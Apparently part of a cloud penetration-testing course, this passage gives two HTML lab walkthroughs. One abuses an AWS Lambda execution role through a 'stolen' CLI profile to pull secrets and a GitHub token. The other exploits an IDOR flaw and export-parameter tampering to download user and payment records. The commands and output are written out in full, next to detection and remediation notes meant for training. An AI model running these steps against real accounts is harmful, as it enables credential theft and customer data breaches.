+        <li>Tools: AWS CLI, jq</li>
+        <li>Complete M05-L01 to have the function list and initial role ARNs identified</li>
+        <li>Note: <code>lambda:InvokeFunction</code> is a write-action that leaves CloudTrail evidence. Use only in authorized lab environments.</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Retrieve the execution role ARN from the function configuration and extract the role name for subsequent IAM enumeration.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda get-function-configuration \
+  --function-name admin-db-backup \
+  --profile stolen \
+  --query 'Role' --output text</div>
+              <div class="terminal-output">arn:aws:iam::123456789012:role/lambda-admin-role</div>
+              <div class="terminal-cmd"># Extract just the role name from the ARN</div>
+              <div class="terminal-cmd">$ ROLE_NAME="lambda-admin-role"</div>
+              <div class="terminal-cmd"># Confirm the role exists and get basic details</div>
+              <div class="terminal-cmd">$ aws iam get-role --role-name "$ROLE_NAME" --profile stolen \
+  --query 'Role.[RoleName,Arn,CreateDate]' --output table</div>
+              <div class="terminal-output">----------------------------------------------------------------------
+|  lambda-admin-role  |  arn:aws:iam::123456789012:role/lambda-admin-role  |  2023-01-10 |
+----------------------------------------------------------------------</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Enumerate managed policies attached to the role. These define the bulk of the role's permissions.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws iam list-attached-role-policies \
+  --role-name "$ROLE_NAME" \
+  --profile stolen</div>
+              <div class="terminal-output">{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "LambdaAdminFullAccess",
+            "PolicyArn": "arn:aws:iam::123456789012:policy/LambdaAdminFullAccess"
+        },
+        {
+            "PolicyName": "AmazonS3FullAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AmazonS3FullAccess"
+        }
+    ]
+}</div>
+              <div class="terminal-cmd"># AmazonS3FullAccess is a managed policy — very broad. Inspect LambdaAdminFullAccess.</div>
+              <div class="terminal-cmd">$ POLICY_ARN="arn:aws:iam::123456789012:policy/LambdaAdminFullAccess"</div>
+              <div class="terminal-cmd">$ VERSION=$(aws iam get-policy --policy-arn "$POLICY_ARN" --profile stolen \
+  --query 'Policy.DefaultVersionId' --output text)</div>
+              <div class="terminal-cmd">$ aws iam get-policy-version \
+  --policy-arn "$POLICY_ARN" \
+  --version-id "$VERSION" \
+  --profile stolen \
+  --query 'PolicyVersion.Document'</div>
+              <div class="terminal-output">{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Action": [
+                "rds:*",
+                "s3:*",
+                "secretsmanager:*",
+                "iam:ListRoles",
+                "iam:GetRole",
+                "iam:PassRole"
+            ],
+            "Resource": "*"
+        }
+    ]
+}</div>
+              <div class="terminal-cmd"># rds:* + secretsmanager:* + iam:PassRole — this role can do massive damage</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Check for inline policies on the role. Inline policies are often missed by automated scanning tools and can contain additional permissions.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws iam list-role-policies \
+  --role-name "$ROLE_NAME" \
+  --profile stolen</div>
+              <div class="terminal-output">{
+    "PolicyNames": [
+        "AllowSecretsManagerRead",
+        "AllowDynamoDBBackup"
+    ]
+}</div>
+              <div class="terminal-cmd">$ aws iam get-role-policy \
+  --role-name "$ROLE_NAME" \
+  --policy-name "AllowSecretsManagerRead" \
+  --profile stolen \
+  --query 'PolicyDocument'</div>
+              <div class="terminal-output">{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Action": [
+                "secretsmanager:GetSecretValue",
+                "secretsmanager:ListSecrets",
+                "secretsmanager:DescribeSecret"
+            ],
+            "Resource": "*"
+        }
+    ]
+}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Invoke the Lambda function with a crafted payload to execute commands in the context of the function's execution role. This abuses the function as a code execution proxy to use the role's permissions.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Invoke the function and capture its output
+# The payload structure depends on the function's expected event format</div>
+              <div class="terminal-cmd">$ aws lambda invoke \
+  --function-name admin-db-backup \
+  --profile stolen \
+  --payload '{"action": "list_secrets"}' \
+  --cli-binary-format raw-in-base64-out \
+  output.txt && cat output.txt</div>
+              <div class="terminal-output">{
+    "statusCode": 200,
+    "body": {
+        "secrets": [
+            "prod/db/credentials",
+            "rds!cluster-abc123-admin",
+            "slack/webhook/devops",
+            "github/deploy-key"
+        ]
+    }
+}</div>
+              <div class="terminal-cmd"># The function responded with a list of secrets it can access via its role
+# Try triggering a backup export which the function is designed to perform</div>
+              <div class="terminal-cmd">$ aws lambda invoke \
+  --function-name admin-db-backup \
+  --profile stolen \
+  --payload '{"action": "backup", "database": "customers", "destination": "s3://corp-db-backups-private/loot/"}' \
+  --cli-binary-format raw-in-base64-out \
+  output.txt && cat output.txt</div>
+              <div class="terminal-output">{
+    "statusCode": 200,
+    "body": {"message": "Backup initiated", "job_id": "backup-20240316-142233"}
+}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">If the function passes user-controlled input to AWS API calls, the execution role's permissions become directly accessible. Test for this pattern in functions that accept resource ARNs or names.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Functions that accept a 'secret_name' parameter may pass it directly to secretsmanager
+$ aws lambda invoke \
+  --function-name admin-db-backup \
+  --profile stolen \
+  --payload '{"action": "get_config", "secret_name": "github/deploy-key"}' \
+  --cli-binary-format raw-in-base64-out \
+  output.txt && cat output.txt</div>
+              <div class="terminal-output">{
+    "statusCode": 200,
+    "body": {
+        "secret": {
+            "github_token": "ghp_abc123def456ghi789jkl012mno345pqr6",
+            "repo_access": "all",
+            "created": "2024-01-15"
+        }
+    }
+}</div>
+              <div class="terminal-cmd"># GitHub PAT with full repo access retrieved by abusing the Lambda's execution role
+# This token can be used to access source code, CI/CD pipelines, and more</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">Get Role ARN</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Enumerate Policies</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Check Inline Policies</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Invoke Function</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">Role Abused</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-triangle-exclamation"></i>
+      <strong>Detection context (MITRE ATT&amp;CK T1078.004 &mdash; Valid Accounts: Cloud Accounts &amp; T1098 &mdash; Account Manipulation):</strong> <code>InvokeFunction</code> generates a CloudTrail <code>Invoke</code> event with the caller's identity. Unusual invocation patterns (different caller than normal, unusual payload shapes, off-hours invocations) should alert. Principle of least privilege: Lambda execution roles should only have access to the specific resources and actions the function requires. Use resource-level ARN restrictions rather than <code>Resource: "*"</code>. Review IAM Access Analyzer findings for overpermissive Lambda roles.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong> Delete local output files: <code>rm -f output.txt</code>. If a backup job was triggered (Step 4), verify with the lab instructor that the backup was cleaned up. IAM enumeration calls (Steps 1&ndash;3) are read-only. No persistent changes were made to AWS resources.
+    </div>
+  </div>
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 5: Sensitive Data Exposure via API Gateway + Lambda      -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M05-L05-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Chain API Gateway endpoint access into the Lambda backend and connected data stores to extract sensitive data by exploiting missing authorization controls, insecure direct object references (IDOR), and parameter tampering.
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>Complete M05-L01 and M05-L02 first &mdash; this lab chains findings from both</li>
+        <li>API key recovered from Lambda source code: <code>sk-internal-abc123def456ghi789</code></li>
+        <li>API invoke URL from M05-L02: <code>https://abc12def34.execute-api.us-east-1.amazonaws.com/prod/</code></li>
+        <li>Tools: curl, jq, Burp Suite (recommended for parameter tampering), Python 3</li>
+        <li>No additional AWS CLI permissions needed &mdash; this lab attacks the application layer via HTTP</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Map the full API &rarr; Lambda &rarr; backend resource chain to understand the data flow before attempting exploitation. Correlate the API resources found in M05-L02 with the Lambda functions from M05-L01.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Check which Lambda function backs each API resource
+$ aws apigateway get-integration \
+  --rest-api-id abc12def34 \
+  --resource-id $(aws apigateway get-resources --rest-api-id abc12def34 \
+    --profile stolen --query 'items[?path==`/users/{userId}`].id' --output text) \
+  --http-method GET \
+  --profile stolen \
+  --query 'uri'</div>
+              <div class="terminal-output">"arn:aws:apigateway:us-east-1:lambda:path/2015-03-31/functions/arn:aws:lambda:us-east-1:123456789012:function:api-user-auth/invocations"</div>
+              <div class="terminal-cmd"># Full chain mapped:
+# GET /users/{userId}  → api-user-auth Lambda → prod-db RDS (customers DB)
+# POST /export         → user-data-export Lambda → S3 (corp-data-exports)
+# GET /admin/users     → api-user-auth Lambda → prod-db RDS (customers DB)
+#
+# api-user-auth uses DB_PASSWORD from environment variables (found in M05-L01/L03)
+# S3_BUCKET=corp-data-exports is accessible with the Lambda execution role permissions</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Test for Insecure Direct Object Reference (IDOR) by accessing another user's data using their ID. The API should validate that the authenticated user can only access their own resources.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># First, authenticate as a normal user to get a JWT token
+# (simulating a low-privilege account in the lab environment)</div>
+              <div class="terminal-cmd">$ curl -s -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"username":"testuser@lab.local","password":"TestPass123!"}' \
+  https://abc12def34.execute-api.us-east-1.amazonaws.com/prod/auth/login | jq .token</div>
+              <div class="terminal-output">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoidS0wNTAiLCJyb2xlIjoidXNlciIsImV4cCI6MTcxMDYwMDAwMH0.abc123"</div>
+              <div class="terminal-cmd">$ TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoidS0wNTAiLCJyb2xlIjoidXNlciIsImV4cCI6MTcxMDYwMDAwMH0.abc123"</div>
+              <div class="terminal-cmd"># Access your own user record</div>
+              <div class="terminal-cmd">$ curl -s -H "Authorization: Bearer $TOKEN" \
+  https://abc12def34.execute-api.us-east-1.amazonaws.com/prod/users/u-050 | jq .</div>
+              <div class="terminal-output">{"id": "u-050", "email": "testuser@lab.local", "name": "Test User", "role": "user"}</div>
+              <div class="terminal-cmd"># IDOR test — try accessing admin user u-001</div>
+              <div class="terminal-cmd">$ curl -s -H "Authorization: Bearer $TOKEN" \
+  https://abc12def34.execute-api.us-east-1.amazonaws.com/prod/users/u-001 | jq .</div>
+              <div class="terminal-output">{"id": "u-001", "email": "admin@targetcorp.com", "name": "Admin User", "role": "superadmin",
+ "phone": "+1-555-0001", "api_token": "tok_admin_xyz789", "mfa_secret": "JBSWY3DPEHPK3PXP"}</div>
+              <div class="terminal-cmd"># IDOR confirmed: no authorization check on userId parameter
+# Retrieved admin's API token and MFA seed — critical finding</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Test for parameter tampering on the <code>/export</code> endpoint. The export function uses user-supplied input to construct S3 paths &mdash; test whether it can be directed to write exports to an attacker-controlled location or read unintended data.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Normal export request (using internal API key from M05-L01)</div>
+              <div class="terminal-cmd">$ curl -s -X POST \
+  -H "x-api-key: sk-internal-abc123def456ghi789" \
+  -H "Content-Type: application/json" \
+  -d '{"format":"csv","table":"users","filter":"role=user"}' \
+  https://abc12def34.execute-api.us-east-1.amazonaws.com/prod/export</div>
+              <div class="terminal-output">{"export_url": "https://corp-data-exports.s3.amazonaws.com/exports/users-filtered-2024-03-16.csv?X-Amz-..."}</div>
+              <div class="terminal-cmd"># Parameter tampering — remove the filter to export ALL users</div>
+              <div class="terminal-cmd">$ curl -s -X POST \
+  -H "x-api-key: sk-internal-abc123def456ghi789" \
+  -H "Content-Type: application/json" \
+  -d '{"format":"csv","table":"users"}' \
+  https://abc12def34.execute-api.us-east-1.amazonaws.com/prod/export</div>
+              <div class="terminal-output">{"export_url": "https://corp-data-exports.s3.amazonaws.com/exports/users-full-2024-03-16.csv?X-Amz-..."}</div>
+              <div class="terminal-cmd"># Try accessing other tables by changing the 'table' parameter</div>
+              <div class="terminal-cmd">$ curl -s -X POST \
+  -H "x-api-key: sk-internal-abc123def456ghi789" \
+  -H "Content-Type: application/json" \
+  -d '{"format":"csv","table":"payment_methods"}' \
+  https://abc12def34.execute-api.us-east-1.amazonaws.com/prod/export</div>
+              <div class="terminal-output">{"export_url": "https://corp-data-exports.s3.amazonaws.com/exports/payment_methods-2024-03-16.csv?X-Amz-..."}</div>
+              <div class="terminal-cmd"># No allowlist on the 'table' parameter — can export any table including payment data</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Download the exported data using the pre-signed S3 URLs and confirm the sensitivity of the extracted records.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Download the full users export via the pre-signed URL</div>
+              <div class="terminal-cmd">$ curl -s "https://corp-data-exports.s3.amazonaws.com/exports/users-full-2024-03-16.csv?X-Amz-..." \
+  -o users-full.csv</div>
+              <div class="terminal-cmd">$ wc -l users-full.csv</div>
+              <div class="terminal-output">45231 users-full.csv</div>
+              <div class="terminal-cmd">$ head -5 users-full.csv</div>
+              <div class="terminal-output">id,email,name,phone,role,created_at,last_login,api_token
+u-001,admin@targetcorp.com,Admin User,+1-555-0001,superadmin,2023-01-15,2024-03-16,tok_admin_xyz789
+u-002,sarah@targetcorp.com,Sarah Johnson,+1-555-0002,admin,2023-01-16,2024-03-15,tok_admin_abc123
+u-003,user1@example.com,User One,+1-555-0003,user,2023-02-01,2024-03-10,tok_user_111222
+u-004,user2@example.com,User Two,+1-555-0004,user,2023-02-02,2024-03-09,tok_user_333444</div>
+              <div class="terminal-cmd">$ curl -s "https://corp-data-exports.s3.amazonaws.com/exports/payment_methods-2024-03-16.csv?X-Amz-..." \
+  -o payment_methods.csv && head -3 payment_methods.csv</div>
+              <div class="terminal-output">user_id,card_last4,card_brand,billing_name,billing_zip,stripe_customer_id
+u-001,4242,Visa,Admin User,10001,cus_abc123
+u-003,1234,Mastercard,User One,90210,cus_def456</div>
+              <div class="terminal-cmd"># 45,230 user records with API tokens + payment data extracted
+# This is a critical data breach scenario — document all findings for the report</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Document the complete attack chain from initial enumeration through data extraction. This demonstrates the full impact of the finding chain to the client.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Attack chain summary</div>
+              <div class="terminal-output">
+ATTACK CHAIN: M05 Lambda + API Gateway
+========================================
+
+Step 1 (M05-L01): lambda:ListFunctions + GetFunction
+  → Downloaded admin-db-backup code ZIP
+  → Found hardcoded: INTERNAL_API_KEY, AWS credentials in source
+
+Step 2 (M05-L02): API Gateway enumeration
+  → Mapped 8 endpoints across 2 stages
+  → Empty-header bypass on /dev/admin
+  → Internal API key accepted on /prod/export and /prod/admin/users
+
+Step 3 (M05-L03): Environment variable sweep (5 functions)
+  → DB passwords: 4 unique passwords across all functions
+  → Stripe live secret key: sk_live_abc123...
+  → JWT signing secret recovered
+
+Step 4 (M05-L04): Lambda execution role abuse
+  → lambda-admin-role: rds:*, s3:*, secretsmanager:*
+  → Invoked function to retrieve GitHub PAT from Secrets Manager
+  → Triggered backup to arbitrary S3 path
+
+Step 5 (M05-L05): IDOR + parameter tampering
+  → IDOR on /users/{userId}: retrieved admin MFA seed and API token
+  → Export endpoint: no table allowlist, exported payment_methods
+  → 45,230 user records + payment data exfiltrated via pre-signed URLs
+
+SEVERITY: Critical
+AFFECTED DATA: Full customer PII, payment card data, admin credentials</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">Map API &rarr; Lambda</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">IDOR Test</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Parameter Tamper</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Download Export</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">Full Data Breach</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-triangle-exclamation"></i>
+      <strong>Detection context (MITRE ATT&amp;CK T1530 &mdash; Data from Cloud Storage &amp; T1083 &mdash; File and Directory Discovery):</strong> IDOR vulnerabilities in Lambda-backed APIs are extremely common because Lambda functions receive the raw event object and developers often forget to validate that the resource in the path matches the authenticated user. Detection: API Gateway access logs with anomaly detection on userId patterns (sequential scanning). Parameter tampering on export endpoints: alert on export requests targeting tables beyond the expected list. All S3 <code>GetObject</code> calls on export buckets should be logged and reviewed. Remediation: implement resource-based authorization in the Lambda handler, use an allowlist for the <code>table</code> parameter, and require user context to scope exports.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong> Delete all downloaded files: <code>rm -f users-full.csv payment_methods.csv</code>. The pre-signed export URLs in S3 will expire automatically (typically 15 minutes to 1 hour). Notify the lab instructor that the export endpoint was exercised so they can verify no persistent data was left in the S3 export bucket. All API calls were authenticated and logged in CloudWatch &mdash; no API Gateway resources were modified.
+    </div>
+  </div>
+
+</div>
